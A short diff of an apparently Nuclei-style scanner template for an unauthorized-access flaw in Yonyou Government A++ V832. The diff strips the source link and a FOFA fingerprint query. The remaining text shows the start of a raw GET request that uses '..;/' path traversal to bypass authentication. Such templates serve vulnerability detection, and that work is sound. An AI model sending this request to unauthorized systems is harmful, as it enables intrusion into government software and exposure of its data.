@@ -3,12 +3,8 @@ info:
   name: 用友政务A++V832产品未授权访问漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/brik2luvebvg0lgf'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: brik2luvebvg0lgf
-    fofa: body="/pf/portal/login/css/fonts/style.css"
 http:
 - raw:
   - 'GET /pub/fe/config/..;/..;/..;/ga/riskClassify/getClassifyTree HTTP/1.1
